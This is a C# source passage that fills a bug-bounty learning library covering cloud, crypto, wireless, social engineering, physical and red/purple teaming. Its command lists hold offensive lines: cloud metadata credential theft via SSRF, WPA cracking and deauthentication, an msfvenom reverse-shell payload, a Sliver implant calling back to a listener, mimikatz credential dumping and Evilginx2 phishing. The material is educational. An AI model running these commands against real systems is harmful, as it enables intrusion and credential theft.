                    new StepItem { Number = 3, Description = "Review AndroidManifest.xml for exported components", Code = "Look for exported activities without permission" },
                    new StepItem { Number = 4, Description = "Set up Burp Suite proxy on device", Code = "Configure device WiFi proxy to Burp" },
                    new StepItem { Number = 5, Description = "Bypass certificate pinning if needed", Code = "Use Frida + objection SSL pinning bypass" },
                    new StepItem { Number = 6, Description = "Test the API endpoints used by the app", Code = "Replay and modify captured mobile API calls" },
                    new StepItem { Number = 7, Description = "Check local data storage", Code = "adb pull app databases and SharedPreferences" }
                },
                Tools = new List<string> { "apktool", "jadx", "MobSF", "Frida", "Objection", "ADB", "Burp Suite", "dex2jar", "Drozer" },
                Resources = new List<string>
                {
                    "https://github.com/MobSF/Mobile-Security-Framework-MobSF",
                    "https://mas.owasp.org/",
                    "https://github.com/frida/frida",
                    "https://github.com/sensepost/objection",
                    "https://portswigger.net/burp/documentation/desktop/mobile"
                }
            };

            libraryTopics["Advanced_Cloud"] = new LibraryTopic
            {
                Tag = "Advanced_Cloud",
                Category = "Advanced Topics",
                Title = "Cloud Security Testing",
                Subtitle = "Testing AWS, GCP, and Azure Environments",
                Content = "Cloud security is one of the fastest-growing areas in bug bounty. Misconfigured cloud services routinely expose sensitive data and allow unauthorized access. Understanding cloud platforms is essential for modern bug hunting.\n\nCommon Cloud Misconfigurations:\n1. Public S3 buckets with sensitive data\n2. Overly permissive IAM roles and policies\n3. Public EC2 instances with sensitive ports open\n4. Exposed cloud metadata endpoints via SSRF\n5. Publicly accessible databases (RDS, DynamoDB)\n6. Misconfigured Kubernetes clusters\n7. Exposed cloud function URLs\n8. Public container registries with sensitive images\n9. CloudTrail/logging disabled\n10. Default VPC with permissive security groups\n\nAWS Specific: S3 bucket misconfigurations, IAM privilege escalation, SSRF to metadata at 169.254.169.254, Lambda function URL exposure, API Gateway misconfigurations.\n\nGCP Specific: GCS bucket permissions, service account key exposure, metadata server at 169.254.169.254/computeMetadata/v1/, Cloud Run/Functions exposure.\n\nAzure Specific: Azure Blob Storage, Azure AD misconfigurations, managed identity abuse, Azure Functions URLs.\n\nSSRF to Cloud Metadata: One of the highest-impact SSRF targets is the cloud metadata endpoint. AWS metadata provides IAM credentials that can allow full AWS account compromise.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "aws s3 ls s3://target-bucket --no-sign-request", Explanation = "List public S3 bucket without credentials." },
                    new CommandItem { Text = "aws s3 cp s3://target-bucket/sensitive.txt . --no-sign-request", Explanation = "Download file from public S3 bucket." },
                    new CommandItem { Text = "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/", Explanation = "Access AWS instance metadata for IAM role credentials via SSRF." },
                    new CommandItem { Text = "curl -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token", Explanation = "Access GCP metadata token via SSRF." },
                    new CommandItem { Text = "python3 enumerate-iam.py --access-key KEY --secret-key SECRET", Explanation = "Enumerate IAM permissions for discovered AWS credentials." },
                    new CommandItem { Text = "trufflehog s3 --bucket=target-bucket", Explanation = "Search S3 bucket contents for secrets." },
                    new CommandItem { Text = "kubectl get pods --all-namespaces", Explanation = "If Kubernetes API is exposed, list all pods." },
                    new CommandItem { Text = "nuclei -u https://target.com -t ~/nuclei-templates/cloud/", Explanation = "Automated cloud misconfiguration scanning with nuclei." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Discover cloud resources via subdomain and asset enumeration", Code = "Find *.s3.amazonaws.com, storage.googleapis.com subdomains" },
                    new StepItem { Number = 2, Description = "Test S3/GCS/Azure Blob for public access", Code = "aws s3 ls s3://bucketname --no-sign-request" },
                    new StepItem { Number = 3, Description = "Test for SSRF to cloud metadata", Code = "http://169.254.169.254/latest/meta-data/" },
                    new StepItem { Number = 4, Description = "If credentials obtained, enumerate permissions", Code = "enumerate-iam.py with found credentials" },
                    new StepItem { Number = 5, Description = "Check for exposed Kubernetes APIs", Code = "port 6443, 8443 on discovered IPs" },
                    new StepItem { Number = 6, Description = "Scan for exposed cloud function URLs", Code = "*.cloudfunctions.net, *.lambda-url.*.on.aws" }
                },
                Tools = new List<string> { "AWS CLI", "enumerate-iam", "truffleHog", "S3Scanner", "CloudMapper", "Pacu", "ScoutSuite", "Prowler" },
                Resources = new List<string>
                {
                    "https://github.com/nccgroup/ScoutSuite",
                    "https://github.com/RhinoSecurityLabs/pacu",
                    "https://github.com/duo-labs/cloudmapper",
                    "https://cloudsecdocs.com/"
                }
            };

            libraryTopics["Advanced_Crypto"] = new LibraryTopic
            {
                Tag = "Advanced_Crypto",
                Category = "Advanced Topics",
                Title = "Cryptography for Hackers",
                Subtitle = "Understanding and Breaking Cryptographic Implementations",
                Content = "Cryptography is the foundation of web security. Understanding cryptographic weaknesses helps you find vulnerabilities in authentication, session management, and data protection. You don't need to be a mathematician - understanding common implementation mistakes is the key.\n\nCommon Cryptographic Mistakes:\n1. Using weak algorithms (MD5, SHA1 for passwords, DES, RC4)\n2. Hardcoded or predictable keys/IVs\n3. ECB mode (patterns in ciphertext)\n4. Padding oracle vulnerabilities\n5. Length extension attacks on unsalted hashes\n6. Weak random number generation\n7. Key reuse\n8. JWT algorithm confusion\n9. Timing attacks on comparison functions\n10. Reusing nonces in AES-GCM\n\nPassword Hashing: Passwords must be hashed with bcrypt, scrypt, Argon2, or PBKDF2. MD5 and SHA1/SHA256 without salt/iterations are insecure for passwords. Hashcat can crack SHA256 hashed passwords at billions per second.\n\nTLS/SSL Issues: Old TLS versions (1.0, 1.1), weak cipher suites, invalid certificates, certificate pinning bypass, BREACH/CRIME/POODLE attacks.\n\nJWT Cryptography: JWT uses HMAC or RSA for signature verification. None algorithm, algorithm confusion (RS256 to HS256), weak HMAC secrets are all vulnerabilities.\n\nPadding Oracle: When an application returns different errors for padding vs MAC errors during CBC decryption, an attacker can decrypt any ciphertext byte by byte.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "sslyze target.com", Explanation = "Comprehensive SSL/TLS analysis tool." },
                    new CommandItem { Text = "testssl.sh https://target.com", Explanation = "Test SSL/TLS configuration for weaknesses." },
                    new CommandItem { Text = "nmap --script ssl-enum-ciphers -p 443 target.com", Explanation = "Enumerate supported SSL/TLS cipher suites." },
                    new CommandItem { Text = "hashcat -m 0 hashes.txt rockyou.txt", Explanation = "Crack MD5 hashed passwords." },
                    new CommandItem { Text = "python3 jwt_tool.py TOKEN -X a", Explanation = "Test JWT for none algorithm vulnerability." },
                    new CommandItem { Text = "python3 padbuster.py https://target.com/page ENCRYPTED_VALUE 8 -encoding 0", Explanation = "Padding oracle attack with padbuster." },
                    new CommandItem { Text = "python3 hash_extender.py -d 'data' -s 'signature' -a 'append' -l 10", Explanation = "Length extension attack on hash signatures." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Test SSL/TLS configuration", Code = "testssl.sh target.com" },
                    new StepItem { Number = 2, Description = "Identify hash algorithms used", Code = "Check login, password reset responses" },
                    new StepItem { Number = 3, Description = "Test JWT vulnerabilities", Code = "None alg, weak secret, RS256 to HS256" },
                    new StepItem { Number = 4, Description = "Look for ECB mode in encrypted cookies", Code = "Repeated blocks indicate ECB" },
                    new StepItem { Number = 5, Description = "Test for padding oracle if CBC mode", Code = "Different error responses for padding vs MAC" },
                    new StepItem { Number = 6, Description = "Check for weak PRNG in tokens", Code = "Predictable session tokens, CSRF tokens" }
                },
                Tools = new List<string> { "sslyze", "testssl.sh", "hashcat", "jwt_tool", "padbuster", "nmap", "CyberChef" },
                Resources = new List<string>
                {
                    "https://testssl.sh/",
                    "https://cryptopals.com/",
                    "https://portswigger.net/web-security/all-topics",
                    "https://github.com/ticarpi/jwt_tool"
                }
            };

            libraryTopics["Advanced_Binary"] = new LibraryTopic
            {
                Tag = "Advanced_Binary",
                Category = "Advanced Topics",
                Title = "Binary Exploitation Basics",
                Subtitle = "Introduction to Binary and Memory Vulnerabilities",
                Content = "Binary exploitation involves finding and exploiting vulnerabilities in compiled programs. While less common in web bug bounty, it's relevant for thick client applications, embedded systems, and programs that web servers execute. This knowledge also improves your understanding of security fundamentals.\n\nCommon Binary Vulnerabilities:\n1. Buffer overflow - Writing beyond allocated buffer\n2. Stack smashing - Overwriting return address on stack\n3. Heap corruption - Use-after-free, double free, heap overflow\n4. Format string vulnerabilities\n5. Integer overflow/underflow\n6. Off-by-one errors\n7. Race conditions in file operations\n8. Command injection in system() calls\n\nModern Protections: ASLR (Address Space Layout Randomization), NX/DEP (Non-Executable memory), Stack Canaries, PIE (Position Independent Executable), RELRO (Read-Only Relocations). Modern exploitation requires bypassing these.\n\nBug Bounty Relevance: Some programs include thick client applications, VPN clients, or executables in scope. Native desktop apps and browser plugins are also sometimes in scope. Understanding binary vulnerabilities helps with SSTI, deserialization, and format string bugs in web contexts.\n\nGetting Started: CTF competitions are the best way to learn binary exploitation. Platforms like pwn.college, exploit.education, and CTFtime provide hands-on practice.\n\nTools: GDB with pwndbg/peda extension for debugging, pwntools for exploit scripting, checksec for binary security analysis, ROPgadget for ROP chain building.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "checksec --file=./binary", Explanation = "Check binary security features (ASLR, NX, Canary, PIE, RELRO)." },
                    new CommandItem { Text = "file ./binary", Explanation = "Identify binary type (ELF, PE, architecture)." },
                    new CommandItem { Text = "strings ./binary | grep -E 'pass|key|secret|admin'", Explanation = "Extract printable strings from binary for hardcoded credentials." },
                    new CommandItem { Text = "ltrace ./binary", Explanation = "Trace library calls during execution." },
                    new CommandItem { Text = "strace ./binary", Explanation = "Trace system calls during execution." },
                    new CommandItem { Text = "gdb -q ./binary", Explanation = "Start debugging session with GDB." },
                    new CommandItem { Text = "python3 -c \"import pwn; pwn.cyclic(100)\"", Explanation = "Generate cyclic pattern for finding buffer overflow offset." },
                    new CommandItem { Text = "objdump -d ./binary | grep -A5 '<main>'", Explanation = "Disassemble binary and show main function." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Identify file type and architecture", Code = "file binary && checksec --file=binary" },
                    new StepItem { Number = 2, Description = "Extract strings for quick wins", Code = "strings binary | grep -i pass" },
                    new StepItem { Number = 3, Description = "Fuzz the binary with random input", Code = "echo 'AAAAAAAAAA' | ./binary" },
                    new StepItem { Number = 4, Description = "Debug crashes with GDB", Code = "gdb ./binary then run with input" },
                    new StepItem { Number = 5, Description = "Practice on CTF platforms", Code = "pwn.college, exploit.education" }
                },
                Tools = new List<string> { "GDB", "pwndbg", "pwntools", "checksec", "ROPgadget", "Ghidra", "IDA Free", "radare2", "ltrace", "strace" },
                Resources = new List<string>
                {
                    "https://pwn.college/",
                    "https://exploit.education/",
                    "https://github.com/pwndbg/pwndbg",
                    "https://github.com/Gallopsled/pwntools",
                    "https://ctftime.org/"
                }
            };

            libraryTopics["Advanced_Wireless"] = new LibraryTopic
            {
                Tag = "Advanced_Wireless",
                Category = "Advanced Topics",
                Title = "Wireless Network Attacks",
                Subtitle = "Testing WiFi and Wireless Security",
                Content = "Wireless network security testing covers WiFi, Bluetooth, and other RF technologies. While less common in pure web bug bounty, wireless testing appears in physical penetration tests and some bug bounty programs that include network infrastructure.\n\nWiFi Security Protocols:\nWEP: Completely broken, crackable in minutes\nWPA: Vulnerable to dictionary attacks on 4-way handshake\nWPA2-Personal: Dictionary attacks against captured handshakes\nWPA2-Enterprise: More secure, targets authentication servers\nWPA3: Modern standard with improved protections\n\nCommon Wireless Attacks:\n1. Packet capture and analysis\n2. Deauthentication attacks to force reconnection\n3. WPA2 handshake capture and offline cracking\n4. Evil Twin / Rogue AP\n5. PMKID attack (no deauth needed)\n6. WPS PIN bruteforce\n7. Bluetooth attacks (BlueSnarfing, BlueBorne)\n\nKali Linux Wireless Tools: aircrack-ng suite (airodump-ng, aireplay-ng, airmon-ng), Kismet for passive discovery, Reaver for WPS attacks, hashcat for offline cracking.\n\nHardware: An external wireless adapter with monitor mode and packet injection capability is required. Popular choices: Alfa AWUS036ACH, Alfa AWUS036ACS.\n\nBug Bounty Relevance: On-site physical security assessments, programs that explicitly include internal network testing.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "airmon-ng start wlan0", Explanation = "Enable monitor mode on wireless interface." },
                    new CommandItem { Text = "airodump-ng wlan0mon", Explanation = "Discover nearby wireless networks in monitor mode." },
                    new CommandItem { Text = "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon", Explanation = "Capture traffic on specific channel and BSSID." },
                    new CommandItem { Text = "aireplay-ng --deauth 10 -a BSSID wlan0mon", Explanation = "Send 10 deauthentication frames to force client reconnection." },
                    new CommandItem { Text = "aircrack-ng capture.cap -w rockyou.txt", Explanation = "Crack WPA2 handshake with dictionary attack." },
                    new CommandItem { Text = "hcxdumptool -o capture.pcapng -i wlan0mon --enable_status=1", Explanation = "Capture PMKID for WPA2 cracking without deauth." },
                    new CommandItem { Text = "hcxpcapngtool -o hashes.hc22000 capture.pcapng && hashcat -m 22000 hashes.hc22000 rockyou.txt", Explanation = "Convert capture to hashcat format and crack." },
                    new CommandItem { Text = "reaver -i wlan0mon -b BSSID -vv", Explanation = "WPS PIN brute force attack." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Enable monitor mode on wireless adapter", Code = "airmon-ng start wlan0" },
                    new StepItem { Number = 2, Description = "Discover target networks", Code = "airodump-ng wlan0mon" },
                    new StepItem { Number = 3, Description = "Capture WPA2 handshake", Code = "airodump-ng -c channel --bssid BSSID -w capture wlan0mon" },
                    new StepItem { Number = 4, Description = "Force client reconnection to capture handshake", Code = "aireplay-ng --deauth 10 -a BSSID wlan0mon" },
                    new StepItem { Number = 5, Description = "Crack handshake offline", Code = "hashcat -m 22000 hashes.hc22000 rockyou.txt" }
                },
                Tools = new List<string> { "aircrack-ng", "airodump-ng", "aireplay-ng", "airmon-ng", "Kismet", "Reaver", "hcxtools", "hashcat", "Wireshark" },
                Resources = new List<string>
                {
                    "https://www.aircrack-ng.org/documentation.html",
                    "https://www.kali.org/tools/aircrack-ng/",
                    "https://github.com/ZerBea/hcxtools"
                }
            };

            libraryTopics["Advanced_Social"] = new LibraryTopic
            {
                Tag = "Advanced_Social",
                Category = "Advanced Topics",
                Title = "Social Engineering Guide",
                Subtitle = "Understanding Human-Based Attack Vectors",
                Content = "Social engineering exploits human psychology rather than technical vulnerabilities. It's the art of manipulating people into revealing information or performing actions that compromise security. While rarely in scope for typical bug bounty programs, understanding it provides context for phishing simulation and security awareness testing.\n\nSocial Engineering Principles:\n1. Pretexting - Creating a fabricated scenario (IT support, vendor)\n2. Phishing - Email-based deception\n3. Spear phishing - Targeted phishing using personal information\n4. Vishing - Voice-based social engineering\n5. Smishing - SMS-based social engineering\n6. Baiting - Using physical media (USB drops)\n7. Tailgating - Physical access by following authorized personnel\n\nOSINT for Social Engineering: LinkedIn for employee research, company website for organizational structure, social media for personal details, breach databases for passwords.\n\nPhishing Campaigns: GoPhish is an open-source phishing framework. Evilginx2 for phishing with 2FA bypass (acts as MITM proxy). SET (Social Engineering Toolkit) for complete campaigns.\n\nBug Bounty Relevance: Some programs specifically include phishing simulation or vishing tests. Always get explicit written permission before any social engineering. Most web bug bounty programs explicitly exclude social engineering.\n\nDefensive Perspective: Understanding social engineering helps build better security awareness programs and identify human-factor vulnerabilities in applications.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "setoolkit", Explanation = "Launch Social Engineering Toolkit (SET) for campaign creation." },
                    new CommandItem { Text = "gophish", Explanation = "Launch GoPhish phishing framework web interface." },
                    new CommandItem { Text = "theHarvester -d target.com -b linkedin", Explanation = "Harvest employee information from LinkedIn via theHarvester." },
                    new CommandItem { Text = "evilginx2", Explanation = "Launch Evilginx2 for phishing with 2FA bypass." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "GET EXPLICIT WRITTEN PERMISSION FIRST", Code = "Social engineering requires explicit scope inclusion" },
                    new StepItem { Number = 2, Description = "OSINT to gather target information", Code = "LinkedIn, company website, social media" },
                    new StepItem { Number = 3, Description = "Create convincing pretext scenario", Code = "IT helpdesk, vendor, compliance audit" },
                    new StepItem { Number = 4, Description = "Execute campaign with full documentation", Code = "Record all interactions for reporting" },
                    new StepItem { Number = 5, Description = "Debrief and provide security awareness recommendations", Code = "Training is the primary deliverable" }
                },
                Tools = new List<string> { "GoPhish", "SET", "Evilginx2", "King Phisher", "theHarvester", "Maltego" },
                Resources = new List<string>
                {
                    "https://getgophish.com/",
                    "https://github.com/kgretzky/evilginx2",
                    "https://www.social-engineer.org/"
                }
            };

            libraryTopics["Advanced_Physical"] = new LibraryTopic
            {
                Tag = "Advanced_Physical",
                Category = "Advanced Topics",
                Title = "Physical Security Testing",
                Subtitle = "Physical Penetration Testing Concepts",
                Content = "Physical security testing involves evaluating real-world physical controls: locks, access control systems, cameras, and perimeter security. It bridges the gap between cyber and physical security. Always requires explicit written authorization.\n\nPhysical Security Testing Areas:\n1. Perimeter security assessment - Fences, lighting, barriers\n2. Entry point analysis - Doors, locks, windows\n3. Access control systems - RFID, keypads, biometrics\n4. CCTV coverage analysis\n5. Tailgating/piggybacking vulnerabilities\n6. Dumpster diving for sensitive information\n7. USB drop attacks\n8. Shoulder surfing opportunities\n\nLock Picking: Lock picking is a valuable skill for physical testers. Basic lock picking uses tension wrenches and picks to manipulate pins. Most common padlocks can be picked. Bump keys are another approach.\n\nRFID/NFC: Proximity cards used in office buildings (HID, Mifare) can be cloned using tools like Proxmark3. Long-range RFID readers can capture credentials from distance.\n\nBadge Cloning: If you can come within a few centimeters of an RFID badge, you can clone it. Tools like Chameleon Mini can emulate cloned badges.\n\nBug Bounty Relevance: Physical security testing is rarely included in standard bug bounty programs. It typically requires a dedicated scope inclusion and special engagement type. It's more common in red team assessments.\n\nIMPORTANT: Never attempt physical security testing without explicit written authorization. Physical testing without permission is trespassing and illegal.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "proxmark3 hf search", Explanation = "Search for nearby NFC/RFID cards with Proxmark3." },
                    new CommandItem { Text = "proxmark3 hf mf chk *1 ? d default_keys.dic", Explanation = "Check Mifare Classic card with default keys." },
                    new CommandItem { Text = "proxmark3 lf hid read", Explanation = "Read HID proximity card data." },
                    new CommandItem { Text = "# Physical recon - note in writing what you observe\n# Document: camera positions, guard schedules, entry points", Explanation = "Physical reconnaissance methodology." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "OBTAIN WRITTEN AUTHORIZATION - non-negotiable", Code = "No physical testing without explicit written scope" },
                    new StepItem { Number = 2, Description = "External perimeter reconnaissance", Code = "Document physical access controls and vulnerabilities" },
                    new StepItem { Number = 3, Description = "Test tailgating vulnerabilities", Code = "Attempt to follow authorized personnel through access points" },
                    new StepItem { Number = 4, Description = "RFID/badge cloning assessment", Code = "Test proximity card clone distance" },
                    new StepItem { Number = 5, Description = "USB drop test", Code = "Plant tracked USB drives and monitor if opened" },
                    new StepItem { Number = 6, Description = "Comprehensive report with photos and recommendations", Code = "Document all findings with supporting evidence" }
                },
                Tools = new List<string> { "Proxmark3", "Chameleon Mini", "LockPicks", "Raspberry Pi (implants)", "HIDGlobal readers" },
                Resources = new List<string>
                {
                    "https://github.com/RfidResearchGroup/proxmark3",
                    "https://www.social-engineer.org/framework/physical-techniques/",
                    "https://www.toool.nl/documents/"
                }
            };

            libraryTopics["Advanced_Red"] = new LibraryTopic
            {
                Tag = "Advanced_Red",
                Category = "Advanced Topics",
                Title = "Red Teaming Methodology",
                Subtitle = "Advanced Adversarial Simulation Techniques",
                Content = "Red teaming is a full-scope adversarial simulation that tests an organization's detection and response capabilities, not just technical vulnerabilities. It combines all attack disciplines: web, network, physical, social engineering, and persistence.\n\nRed Team vs Penetration Testing:\nPenetration Testing: Find as many vulnerabilities as possible in defined scope within a time limit.\nRed Teaming: Simulate a real threat actor achieving specific objectives (data exfiltration, persistence). Stealth and detection evasion are priorities.\n\nRed Team Phases:\n1. Planning - Define objectives, rules of engagement, scope\n2. Reconnaissance - OSINT, attack surface mapping\n3. Initial Access - Exploitation, phishing, physical\n4. Persistence - Maintain access across reboots\n5. Lateral Movement - Move through network from initial foothold\n6. Privilege Escalation - Gain higher permissions\n7. Objective Achievement - Data exfiltration, access to target system\n8. Reporting - Blue team engagement findings\n\nC2 Frameworks: Command and Control (C2) frameworks manage compromised systems. Cobalt Strike (commercial), Metasploit, Covenant, Sliver, and Havoc are popular options.\n\nEvasion: Red teams must evade AV/EDR, IDS/IPS, and SIEM. Techniques include process injection, living-off-the-land (LOLBins), obfuscation, and custom tooling.\n\nBug Bounty Relevance: Some advanced programs include red team elements. Understanding red team concepts helps understand attacker mindset and improves web bug hunting.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "sliver generate --mtls 192.168.1.100 --os windows --arch amd64 --save implant.exe", Explanation = "Generate Sliver C2 implant for Windows (open-source C2 framework)." },
                    new CommandItem { Text = "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f exe > payload.exe", Explanation = "Generate Metasploit HTTPS payload for AV evasion." },
                    new CommandItem { Text = "SharpHound.exe --CollectionMethods All", Explanation = "Collect Active Directory data for BloodHound analysis." },
                    new CommandItem { Text = "bloodhound-python -u user -p pass -ns DC_IP -d domain.local -c All", Explanation = "Collect AD data with Python BloodHound collector." },
                    new CommandItem { Text = "net user /domain", Explanation = "Enumerate domain users - living off the land technique." },
                    new CommandItem { Text = "mimikatz.exe 'sekurlsa::logonpasswords' 'exit'", Explanation = "Dump credentials from memory (requires admin/SYSTEM)." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Define clear objectives and rules of engagement", Code = "What is the red team trying to achieve?" },
                    new StepItem { Number = 2, Description = "Comprehensive OSINT and reconnaissance", Code = "All passive recon techniques combined" },
                    new StepItem { Number = 3, Description = "Establish initial access foothold", Code = "Phishing, exploit, physical, or web" },
                    new StepItem { Number = 4, Description = "Establish persistence mechanisms", Code = "Scheduled tasks, registry, services" },
                    new StepItem { Number = 5, Description = "Lateral movement through internal network", Code = "Pass-the-hash, token impersonation" },
                    new StepItem { Number = 6, Description = "Achieve defined objectives", Code = "Exfiltrate target data or reach target system" },
                    new StepItem { Number = 7, Description = "Provide debrief to blue team", Code = "Full kill chain report with detection opportunities" }
                },
                Tools = new List<string> { "Cobalt Strike", "Sliver", "Covenant", "Metasploit", "BloodHound", "Mimikatz", "Impacket", "CrackMapExec", "Havoc" },
                Resources = new List<string>
                {
                    "https://github.com/BishopFox/sliver",
                    "https://github.com/BloodHoundAD/BloodHound",
                    "https://www.cobaltstrike.com/training/",
                    "https://github.com/SecureAuthCorp/impacket",
                    "https://attack.mitre.org/"
                }
            };

            libraryTopics["Advanced_Purple"] = new LibraryTopic
            {
                Tag = "Advanced_Purple",
                Category = "Advanced Topics",
                Title = "Purple Teaming Concepts",
                Subtitle = "Combining Red and Blue Team Disciplines",
                Content = "Purple teaming is a collaborative approach where red team (attackers) and blue team (defenders) work together to improve security. Unlike traditional red teaming where the blue team is kept in the dark, purple teaming is transparent and educational.\n\nPurple Team Philosophy: The goal is not to win against the blue team, but to improve the organization's overall security posture. Every technique tested either validates existing detection or reveals a gap to fix.\n\nPurple Team Benefits:\n1. Faster skill development for blue team\n2. Immediate detection feedback for red team\n3. Cost-effective compared to full red team exercises\n4. Measurable improvement in detection capabilities\n5. Better relationship between security teams\n6. Validated security controls\n\nPurple Team Process:\n1. Threat intelligence - Identify relevant adversaries and TTPs\n2. Technique selection - Choose specific MITRE ATT&CK techniques\n3. Execution - Red team executes technique\n4. Detection check - Blue team verifies detection fired\n5. Improvement - If not detected, create new detection rules\n6. Validation - Re-execute to confirm detection now works\n\nMITRE ATT&CK Framework: The definitive reference for adversary tactics, techniques, and procedures (TTPs). Purple teams map their exercises to ATT&CK for standardized reporting and measurement.\n\nAtomic Red Team: Open-source project with small, testable simulations for each ATT&CK technique. Easy to run without full C2 infrastructure. Great for purple team exercises.\n\nBug Bounty Relevance: Purple team methodology helps you understand detection evasion, which improves your overall offensive security knowledge. Understanding what defenses look for helps you find gaps.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "Invoke-AtomicTest T1003.001", Explanation = "Run Atomic Red Team test for LSASS memory dumping (ATT&CK T1003.001)." },
                    new CommandItem { Text = "Invoke-AtomicTest T1059.001 -ShowDetailsBrief", Explanation = "Show details for PowerShell execution technique tests." },
                    new CommandItem { Text = "python3 caldera.py --insecure", Explanation = "Launch CALDERA adversary emulation platform." },
                    new CommandItem { Text = "# Check SIEM for detection after each technique\n# Splunk: index=* sourcetype=* | search specific_indicators", Explanation = "Validate detection in SIEM after each atomic test." },
                    new CommandItem { Text = "sigma-cli convert -t splunk rule.yml", Explanation = "Convert Sigma detection rule to Splunk query." },
                    new CommandItem { Text = "python3 vectr.py", Explanation = "Launch VECTR for purple team tracking and reporting." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Select threat actor and relevant MITRE ATT&CK techniques", Code = "Use ATT&CK Navigator to map techniques" },
                    new StepItem { Number = 2, Description = "Brief blue team on exercise scope and objectives", Code = "Purple = transparent collaboration" },
                    new StepItem { Number = 3, Description = "Execute atomic tests one at a time", Code = "Invoke-AtomicTest T1003.001" },
                    new StepItem { Number = 4, Description = "Immediately verify detection in SIEM", Code = "Did the alert fire? Was the alert accurate?" },
                    new StepItem { Number = 5, Description = "Document gaps where detection failed", Code = "Create new Sigma rules for missed techniques" },
                    new StepItem { Number = 6, Description = "Re-test after detection rules are added", Code = "Validate the new detection works" },
                    new StepItem { Number = 7, Description = "Generate ATT&CK coverage report", Code = "Show which techniques are now detected" }
                },
                Tools = new List<string> { "Atomic Red Team", "CALDERA", "VECTR", "MITRE ATT&CK Navigator", "Sigma", "Splunk", "Elastic SIEM", "Atomic Red Team" },
                Resources = new List<string>
                {
                    "https://attack.mitre.org/",
                    "https://github.com/redcanaryco/atomic-red-team",
                    "https://github.com/mitre/caldera",
                    "https://github.com/SecurityRiskAdvisors/VECTR",
                    "https://github.com/SigmaHQ/sigma"
                }
            };
        }
    }

    

    public class LibraryTopic
    {
        public string Tag { get; set; } = string.Empty;
        public string Category { get; set; } = string.Empty;
        public string Title { get; set; } = string.Empty;
        public string Subtitle { get; set; } = string.Empty;
        public string Content { get; set; } = string.Empty;
        public List<CommandItem> Commands { get; set; } = new List<CommandItem>();
        public List<StepItem> Steps { get; set; } = new List<StepItem>();
        public List<string> Tools { get; set; } = new List<string>();
        public List<string> Resources { get; set; } = new List<string>();
    }

    public class CommandItem
    {
        public string Text { get; set; } = string.Empty;
        public string Explanation { get; set; } = string.Empty;
    }

    public class StepItem
    {
        public int Number { get; set; }
        public string Description { get; set; } = string.Empty;
        public string Code { get; set; } = string.Empty;
    }
}
